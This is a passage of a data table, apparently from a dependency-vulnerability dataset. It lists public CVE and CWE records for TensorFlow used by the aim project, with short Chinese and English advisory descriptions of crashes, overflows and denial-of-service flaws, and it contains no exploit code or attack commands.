Tensorflow 存在资源管理错误漏洞，修复将包含在TensorFlow 2.8.0中。我们也会在TensorFlow 2.7.1、TensorFlow 2.6.3和TensorFlow 2.5.3上选择这个提交，因为这些也会受到影响，并且仍然在支持范围内。",2,0
aimhubio_aim,tensorflow,,True,CVE-2023-25660,CWE-476,2023-03-24,Google TensorFlow 是一套用于机器学习的开源平台。该漏洞源于当 `tf.raw_ops.Print` 的参数 `summarize` 为零时，新方法 `SummarizeArray<bool>` 会引用空指针，导致段错误。,2,2
aimhubio_aim,tensorflow,,True,CVE-2021-29575,CWE-119 CWE-787,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在缓冲区错误漏洞，该漏洞允许堆栈溢出和/或基于`CHECK`-fail的拒绝服务。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-29617,CWE-755,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过利用来自实现CHECK失败来导致拒绝服务。",4,0
aimhubio_aim,tensorflow,,True,CVE-2022-21738,CWE-190,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于SparseCountSparseOutput的实现可以通过整数溢出使一个TensorFlow进程崩溃，其结果随后被用于内存分配。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-29538,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在安全漏洞，攻击者可利用该漏洞可以导致“Conv2DBackpropFilter”中出现除零。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-37638,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.6.0 之前版本、2.5.1之前版本、2.4.3之前版本和2.3.4之前版本存在代码问题漏洞，该漏洞源于为`tf.rawu ops.RaggedTensorToTensor`API的`rowu partitionu types`发送无效参数将导致空指针取消引用和未定义的行为",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-21725,CWE-369,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于某些卷积运算的代价估计器可以用来执行一个被0除的运算。函数未能检查stride参数是否严格为正。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-41217,CWE-476,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于在受影响的版本中，当应该配对的节点没有时，为 TensorFlow 模型构建控制流图的过程容易受到空指针异常的影响，该问题可能会导致程序崩溃。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37635,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在缓冲区错误漏洞，该漏洞源于软件中的稀疏缩减操作的实现可能会触发堆分配边界之外的数据访问。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-35934,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.1、2.8.1和 2.7.2版本存在安全漏洞，该漏洞源于TensorFlow 中 tf.reshape op 的实现很容易受到张量中元素数量溢出影响，导致 CHECK-failure（断言失败），攻击者利用该漏洞可以导致服务拒绝。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-35970,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 QuantizedInstanceNorm 被赋予 x_min 或 x_max 非零等级的张量，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-23565,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，攻击者可利用该漏洞通过更改磁盘上的 SavedModel 来触发拒绝服务。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-37659,CWE-125 CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，攻击者可以通过在所有不需要广播的二进制""cwise""操作中绑定对空指针的引用来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-21735,CWE-369,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于FractionalMaxPool的实现可以通过除0使TensorFlow进程崩溃。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-29530,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在安全漏洞，攻击者可利用该漏洞可以通过向tf.raw_ops.SparseMatrixSparseCholesky提供一个无效的置换来触发空指针解引用。",4,0
aimhubio_aim,tensorflow,,True,CVE-2022-35989,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 MaxPool 接收到一个窗口大小的输入数组 ksize 的维度大于其输入张量 input 时，GPU 内核会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-35996,CWE-369,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于如果 Conv2D 被指定为空 input 并且 filter 和 padding 大小有效，则输出全为零。这会导致除零浮点异常，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29552,CWE-617,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过控制num segments张量参数UnsortedSegmentJoin的值来导致拒绝服务。",4,0
aimhubio_aim,tensorflow,,True,CVE-2022-29198,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.SparseTensorToCSRSparseMatrix 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-41214,CWE-824,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，“tf.ragged.cross”的形状推断代码由于绑定了对“nullptr”的引用而具有未定义的行为。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-35999,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 Conv2DBackpropInput 接收到空的 out_backprop 输入（例如 [3, 1, 0, 1] ）时，当前的 CPU/GPU 内核断言失败（一个带有 dnnl，另一个带有 cudnn）。这可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-41909,CWE-20 CWE-476,2022-11-18,Google TensorFlow 是一套用于机器学习的开源平台。在某些版本（如 2.11、2.10.1 及之前的 2.10.x、2.9.3 及之前的 2.9.x 版本，以及 2.8.4 之前的 2.8.x 版本）中，一个无效的 `CompositeTensorVariant` 张量输入 `encoded` 会导致 `tf.raw_ops.CompositeTensorVariantToComponents` 触发段错误存。这是由于输入的验证不当导致的代码缺陷。,3,0
aimhubio_aim,tensorflow,,True,CVE-2022-21737,CWE-754,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于*Bincount操作的实现允许恶意用户通过传入会触发CHECK失败的参数来拒绝服务。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-29211,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于tf.histogram_fixed_width值出现非数字元素时应用会发生崩溃。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-36026,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果给 QuantizeAndDequantizeV3 一个非标量 num_bits 输入张量，它会导致断言失败，可以用来触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-23563,CWE-367,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于 TensorFlow 使用 tempfile.mktemp 来创建临时文件。虽然这在测试中是可以接受的，但在实用程序和库中这是危险的，因为不同的进程可以在检查 mktemp 中的文件名和通过后续操作实际创建文件之间创建文件（TOC/TOU 类型弱点）。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-21740,CWE-787,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于SparseCountSparseOutput的实现容易出现堆溢出。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-29592,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞允许传递带有null缓冲区支持的张量一维形状。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29522,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以触发一个在tf.raw_ops.Conv3DBackprop*中为0的除法。",4,0
aimhubio_aim,tensorflow,,True,CVE-2023-25669,CWE-697,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在安全漏洞，该漏洞源于如果 `tf.raw_ops.AvgPoolGrad` 的步幅和窗口大小不是正数，它会给出浮点异常。",2,2
aimhubio_aim,tensorflow,,True,CVE-2022-29194,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.DeleteSessionTensor 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37692,CWE-20,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于Go 代码可能会触发字符串释放中的段错误。",3,0
aimhubio_aim,tensorflow,,True,,CWE-476,2020-04-01,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to NULL Pointer Dereference. A carefully crafted GIF images can produce a null pointer dereference during decoding.
## Remediation
Upgrade `tensorflow` to version 1.12.2 or higher.
## References
- [GitHub Changelog](https://github.com/tensorflow/tensorflow/blob/622a516e710e249ddc65a8a977ff1ae78b4d2e4d/RELEASE.md#release-1122)
",3,0
aimhubio_aim,tensorflow,,True,,CWE-125,2020-04-01,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Out-of-bounds Read. Decoding variant tensors from proto could result in heap out of bounds memory access.
## Remediation
Upgrade `tensorflow` to version 2.0.0 or higher.
## References
- [GitHub Changelog](https://github.com/tensorflow/tensorflow/blob/622a516e710e249ddc65a8a977ff1ae78b4d2e4d/RELEASE.md#release-200)
",3,0
aimhubio_aim,tensorflow,,True,,CWE-400,2022-11-22,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS) due to another discovered instance of [CVE-2022-35991](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3026856), in `TensorListScatter` and `TensorListScatterV2` via non scalar inputs.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.4, 2.9.3, 2.10.1 or higher.
## References
- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1)
",3,0
aimhubio_aim,tensorflow,,True,,CWE-400,2022-11-22,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS) due to another discovered instance of [CVE-2022-35935](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3026914) in `SobolSample` via assumed scalar inputs.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.4, 2.9.3, 2.10.1 or higher.
## References
- [GitHub Commit #1](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf)
- [GitHub Commit #2](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)
",2,2
aimhubio_aim,tensorflow,,True,CVE-2022-41908,CWE-20,2022-11-18,Google TensorFlow是一个用于机器学习的端到端开源平台。该漏洞源于不是UTF-8字节串的输入'token'将在'tf.raw_ops.PyFunc'中触发'CHECK'失败。涉及的版本包括2.8.4之前的版本、2.9.0到2.9.3和2.10.0版本。,3,0
aimhubio_aim,tensorflow,,True,CVE-2021-41200,CWE-617,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，在受影响的版本中，如果使用非标量参数调用 `tf.summary.create_file_writer`，代码会由于 `CHECK` 失败而崩溃。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37645,CWE-681,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在数字错误漏洞，该漏洞源于在受影响的版本中，“tf.raw_ops.QuantizeAndDequantizeV4Grad”的实现容易受到整数溢出问题的攻击，这是由于将有符号整数值转换为无符号整数值，然后根据该值分配内存而导致的。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-41223,CWE-125,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，`FusedBatchNorm` 内核的实现容易受到堆 OOB 访问的影响。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-21729,CWE-190,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于explaindex的实现容易受到由整数溢出bug引起的除0的影响。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-37653,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于`ResourceGather`中的除以0错误。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-41201,CWE-824,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞可能导致未初始化的变量访问。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-23570,CWE-476 CWE-617,2022-02-04,TensorFlow在从protobuf解码张量时，如果某些操作的可变参数的属性缺失，可能会发生空指针解引用。尽管这种情况被`DCHECK`保护，但生产环境下`DCHECK`不会执行任何操作，而在调试构建中会因断言失败而崩溃。在第一种情况下，程序会继续执行到空指针的解引用，而第二种情况下会因断言失败而崩溃。,2,0
aimhubio_aim,tensorflow,,True,CVE-2021-29551,CWE-125,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在缓冲区错误漏洞，该漏洞源于MatrixTriangularSolve实现将无法终止内核执行。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-29539,CWE-681,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 存在安全漏洞，该漏洞源于代码假定张量内容是纯标量，变体会导致实现中的段错误。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-37691,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于TFLite 中除法的实现易受 0 错误除法的影响。",3,0
aimhubio_aim,tensorflow,,True,CVE-2023-25661,CWE-20,2023-03-27,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。TensorFlow 2.11.1之前版本存在输入验证错误漏洞，该漏洞源于恶意的无效输入会使tensorflow模型崩溃，并可用于触发拒绝服务攻击。,3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29562,CWE-617,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过利用来自实现CHECK失败来导致拒绝服务。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-29586,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞源于调用ComputePaddingHeightWidth之前没有检查stride是否为0。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-37668,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 中存在数字错误漏洞，该漏洞源于产品的 tf.raw_ops.UnravelIndex 未对除数做有效限制，攻击者可通过除0导致拒绝服务。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
aimhubio_aim,tensorflow,,True,CVE-2023-25675,CWE-697,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在安全漏洞，该漏洞源于当使用 XLA 运行 2.12.0 和 2.11.1 之前的版本时，如果给定的参数 weights 与参数 arr 的形状既不相同，也不是长度为 0 的张量，则 `tf.raw_ops.Bincount` 会出现段错误。",2,2
aimhubio_aim,tensorflow,,True,CVE-2020-15211,CWE-125 CWE-787,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
tensorflow-lite 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞允许攻击者从堆分配的数组的边界之外进行写入和读取。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-41883,CWE-125,2022-11-18,Google TensorFlow是一款用于机器学习的开源平台。该漏洞源于操作接收到不同数量的输入时，错误地处理输入大小，导致执行程序崩溃。,3,0
aimhubio_aim,tensorflow,,True,CVE-2022-29203,CWE-190,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于tf.raw_ops.SpaceToBatchND存在整数溢出问题。攻击者可以通过断言失败利用该漏洞实现拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-23569,CWE-617,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于TensorFlow中的多个操作可以通过CHECK失败(即断言失败)来触发拒绝服务。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-29207,CWE-20 CWE-475,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在安全漏洞，该漏洞源于当提供给应用的资源句柄无效时，多个tensorflow操作在急切模式下行为异常。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-35968,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 AvgPoolGrad 的实现没有完全验证输入 orig_input_shape 。这会导致断言失败，该失败可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-41221,CWE-120 CWE-787,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于 Cudnn* 操作的形状推断代码可以通过堆缓冲区溢出被欺骗访问无效内存。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-37646,CWE-681,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于""tf.raw_ops.StringNGrams""的实现容易受到整数溢出问题的影响，该问题是由将有符号整数值转换为无符号整数值然后根据该值分配内存而引起的。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
aimhubio_aim,tensorflow,,True,CVE-2023-25672,CWE-476,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在代码问题漏洞，该漏洞源于函数 `tf.raw_ops.LookupTableImportV2` 无法处理 `values` 参数中的标量并给出 NPE。",2,2
aimhubio_aim,tensorflow,,True,CVE-2022-23585,CWE-401,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于当解码PNG图像时，如果图像无效，TensorFlow可能会产生内存泄漏。",3,0
aimhubio_aim,tensorflow,,True,CVE-2023-25668,CWE-122 CWE-125,2023-03-24,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。存在安全漏洞，攻击者可以利用该漏洞访问不受用户控制的堆内存，从而导致程序崩溃或远程代码执行。,1,2
aimhubio_aim,tensorflow,,True,CVE-2021-29535,CWE-131 CWE-787,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过传入无效的量化阈值来导致“QuantizedMul”中的堆缓冲区溢出。",4,0
aimhubio_aim,tensorflow,,True,CVE-2022-41895,CWE-125,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果 `MirrorPadGrad` 的输入 `paddings` 过大，TensorFlow 将生成堆信息外带（Out of Band）错误，导致缓冲区溢出。,3,0
aimhubio_aim,tensorflow,,True,CVE-2022-35994,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 CollectiveGather 接收到标量输入 input 时，它会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29573,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在数字错误漏洞，该漏洞源于tf.raw_ops.MaxPoolGradWithArgmax容易被0除法。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-41218,CWE-369,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.7.0之前版本存在数字错误漏洞，该漏洞源于TensorFlow中的AllToAll在推断代码时会执行除以0。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-41197,CWE-190,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于 TensorFlow 允许张量具有大量维度，并且每个维度都可以根据需要进行调整。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29544,CWE-754,2021-05-14,"TensorFlow是TensorFlow开源的一套用于机器学习的端到端开源平台。
TensorFlow存在代码问题漏洞，攻击者可利用该漏洞可以通过利用来自实现CHECK失败来导致拒绝服务。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-37657,CWE-824,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，攻击者可以通过在所有类型为""tf.raw_ops.MatrixDiagV*""的操作中绑定对空指针的引用来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-23581,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于TensorFlow中的er优化器可以通过修改SavedModel来导致拒绝服务，这样issimplifiableshape就会触发CHECK失败。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-41880,CWE-125,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于 `BaseCandidateSamplerOp` 函数接收到 `true_classes` 中的值大于 `range_max` 时，会发生堆外读取。,3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29599,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在数字错误漏洞，该漏洞源于“Split”TFLite操作符的实现容易受到被零除法错误的影响。",4,0
aimhubio_aim,tensorflow,,True,CVE-2020-15194,CWE-20 CWE-617,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow  SparseFillEmptyRowsGrad 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞源于SparseFillEmptyRowsGrad实现对其参数形状的验证不完全，该漏洞允许攻击者可以传递错误的grad_values_t来触发vec中的断言失败，从而导致服务安装中的服务被拒绝。",3,2
aimhubio_aim,tensorflow,,True,CVE-2021-37665,CWE-20,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
